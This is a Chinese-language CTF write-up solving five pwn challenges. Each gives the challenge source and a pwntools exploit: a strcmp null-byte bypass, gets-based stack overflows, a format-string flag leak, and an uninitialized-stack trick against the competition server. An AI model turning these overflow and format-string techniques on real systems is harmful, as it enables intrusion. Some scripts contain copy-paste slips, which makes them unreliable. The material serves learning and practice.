很有趣的一个比赛，基本每个题目都能学到东西。

# Secure Login

```c
#include <stdio.h>

char password[128];

void generate_password() {
	FILE *file = fopen("/dev/urandom","r");
	fgets(password, 128, file);
	fclose(file);
}

void main() {
	puts("Welcome to my ultra secure login service!");

	// no way they can guess my password if it's random!
	generate_password();

	char input[128];
	printf("Enter the password: ");
	fgets(input, 128, stdin);

	if (strcmp(input, password) == 0) {
		char flag[128];

		FILE *file = fopen("flag.txt","r");
		if (!file) {
		    puts("Error: missing flag.txt.");
		    exit(1);
		}

		fgets(flag, 128, file);
		puts(flag);
	} else {
		puts("Wrong!");
	}
}
```

这里通过`/dev/urandom`生成的随机密码，`strcmp`在比较的的两个字符串，所以传入的数据都当作字符串进行处理，当遇到'\x00'和'\n'的时候，比较就结束了。

通过`/dev/urandom`生成的字符串也是有一定的几率生成开头就'\x00'截断的字符的，所以通过暴力破解就可以bypass检查。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
#context.log_level="DEBUG"
#context.arch="amd64"
context.log_level = 'error'

local=1
binary='./login'
#gdb.attach(sh)
# if local:
# 	sh=process(binary)
# else:
# 	sh=remote('shell.actf.co',21820)

# elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so')
#gdb.attach(sh)

for i in range(10000):
    sh=process(binary)
    sh.sendline('\x00')
    sh.recvuntil(': ')
    buf = sh.recv()
    if (not 'Wrong!' in buf):
        print(buf)
    sh.close()
```

# tranquil

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int win(){
    char flag[128];
    FILE *file = fopen("flag.txt","r");
    
    if (!file) {
        printf("Missing flag.txt. Contact an admin if you see this on remote.");
        exit(1);
    }
    
    fgets(flag, 128, file);
    
    puts(flag);
}

int vuln(){
    char password[64];
    puts("Enter the secret word: ");
    gets(&password);
    if(strcmp(password, "password123") == 0){
        puts("Logged in! The flag is somewhere else though...");
    } else {
        puts("Login failed!");
    } 
    return 0;
}


int main(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    vuln();
    // not so easy for you!
    // win();
    
    return 0;
}
```

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./0ctf_2017_babyheap'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('shell.actf.co', 21830)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so')
#gdb.attach(sh)

payload = 'a'*0x40+'a'*8+p32(0x0401196)
sh.sendline(payload)

sh.interactive()
```

# Sanity Checks

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void main(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    char password[64];
    int ways_to_leave_your_lover = 0;
    int what_i_cant_drive = 0;
    int when_im_walking_out_on_center_circle = 0;
    int which_highway_to_take_my_telephones_to = 0;
    int when_i_learned_the_truth = 0;
    
    printf("Enter the secret word: ");
    
    gets(&password);
    
    if(strcmp(password, "password123") == 0){
        puts("Logged in! Let's just do some quick checks to make sure everything's in order...");
        if (ways_to_leave_your_lover == 50) {
            if (what_i_cant_drive == 55) {
                if (when_im_walking_out_on_center_circle == 245) {
                    if (which_highway_to_take_my_telephones_to == 61) {
                        if (when_i_learned_the_truth == 17) {
                            char flag[128];
                            
                            FILE *f = fopen("flag.txt","r");
                            
                            if (!f) {
                                printf("Missing flag.txt. Contact an admin if you see this on remote.");
                                exit(1);
                            }
                            
                            fgets(flag, 128, f);
                            
                            printf(flag);
                            return;
                        }
                    }
                }
            }
        }
        puts("Nope, something seems off.");
    } else {
        puts("Login failed!");
    }
}
```

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./0ctf_2017_babyheap'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('shell.actf.co', 21830)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so')
#gdb.attach(sh)

payload = 'password123\x00'
payload = payload.ljust((0x60-0x14,'\x00'))+p32(17)+p32(61)+p32(245)+p32(55)+p32(50)
sh.sendline(payload)

sh.interactive()
```

# 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct Secrets {
    char secret1[50];
    char password[50];
    char birthday[50];
    char ssn[50];
    char flag[128];
} Secrets;


int vuln(){
    char name[7];

    Secrets boshsecrets = {
        .secret1 = "CTFs are fun!",
        .password= "password123",
        .birthday = "1/1/1970",
        .ssn = "123-456-7890",
    };

    FILE *f = fopen("flag.txt","r");
    if (!f) {
        printf("Missing flag.txt. Contact an admin if you see this on remote.");
        exit(1);
    }
    fgets(&(boshsecrets.flag), 128, f);

    puts("Name: ");

    fgets(name, 6, stdin);

    printf("Welcome, ");
    printf(name);
    printf("\n");

    return 0;
}

int main(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    vuln();

    return 0;
}
```

## exp

利用格式化字符串将栈上的flag输出

```python
import binascii

flag =['6c65777b66746361',
	'61625f6d27695f6c',
	'6c625f6e695f6b63',
	'5f7365795f6b6361',
	'6b6361625f6d2769',
	'5f6568745f6e695f',
	'65625f6b63617473',
	'3439323135623963',
	'3438363737646165',
	'7d333935663161']


for i in flag:
    str_s = binascii.a2b_hex(i).decode()
    print(str_s[::-1])
```

# RAIId Shadow Legends

```c
#include <iostream>
#include <fstream>
#include <string>

using namespace std;

ifstream flag("flag.txt");

struct character {
	int health;
	int skill;
	long tokens;
	string name;
};

void play() {
	string action;
	character player;
	cout << "Enter your name: " << flush;
	getline(cin, player.name);
	cout << "Welcome, " << player.name << ". Skill level: " << player.skill << endl;
	while (true) {
		cout << "\n1. Power up" << endl;
		cout << "2. Fight for the flag" << endl;
		cout << "3. Exit game\n" << endl;
		cout << "What would you like to do? " << flush;
		cin >> action;
		cin.ignore();
		if (action == "1") {
			cout << "Power up requires shadow tokens, available via in app purchase." << endl;
		} else if (action == "2") {
			if (player.skill < 1337) {
				cout << "You flail your arms wildly, but it is no match for the flag guardian. Raid failed." << endl;
			} else if (player.skill > 1337) {
				cout << "The flag guardian quickly succumbs to your overwhelming power. But the flag was destroyed in the frenzy!" << endl;
			} else {
				cout << "It's a tough battle, but you emerge victorious. The flag has been recovered successfully: " << flag.rdbuf() << endl;
			}
		} else if (action == "3") {
			return;
		}
	}
}

void terms_and_conditions() {
	string agreement;
	string signature;
	cout << "\nRAIId Shadow Legends is owned and operated by Working Group 21, Inc. ";
	cout << "As a subsidiary of the International Organization for Standardization, ";
	cout << "we reserve the right to standardize and/or destandardize any gameplay ";
	cout << "elements that are deemed fraudulent, unnecessary, beneficial to the ";
	cout << "player, or otherwise undesirable in our authoritarian society where ";
	cout << "social capital has been eradicated and money is the only source of ";
	cout << "power, legal or otherwise.\n" << endl;
	cout << "Do you agree to the terms and conditions? " << flush;
	cin >> agreement;
	cin.ignore();
	while (agreement != "yes") {
		cout << "Do you agree to the terms and conditions? " << flush;
		cin >> agreement;
		cin.ignore();
	}
	cout << "Sign here: " << flush;
	getline(cin, signature);
}

int main() {
	cout << "Welcome to RAIId Shadow Legends!" << endl;
	while (true) {
		cout << "\n1. Start game" << endl;
		cout << "2. Purchase shadow tokens\n" << endl;
		cout << "What would you like to do? " << flush;
		string action;
		cin >> action;
		cin.ignore();
		if (action == "1") {
			terms_and_conditions();
			play();
		} else if (action == "2") {
			cout << "Please mail a check to RAIId Shadow Legends Headquarters, 1337 Leet Street, 31337." << endl;
		}
	}
}
```

在生成玩家信息的时候，没有进行任何的修改操作，仅仅是输出。所以如果栈的那个位置本来就是`1337`就会满足要求。

所以在`terms_and_conditions`输入`0x539`就可能改变栈内容。

## exp

```c
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.log_level="DEBUG"
#context.arch="amd64"

local=1
binary='./raiid_shadow_legends'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('shell.actf.co',21300)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so')

sh.sendlineafter('What would you like to do?','1')

for i in range(10):
	sh.sendlineafter('Do you agree to the terms and conditions?',p32(0x539)*2)
	sh.sendlineafter('Do you agree to the terms and conditions?','yes')
	sh.sendlineafter('Sign here:',p32(0x539)*2)
	sh.sendlineafter('Enter your name:',p32(0x539)*2)
	sh.sendline('2')

sh.interactive()
```

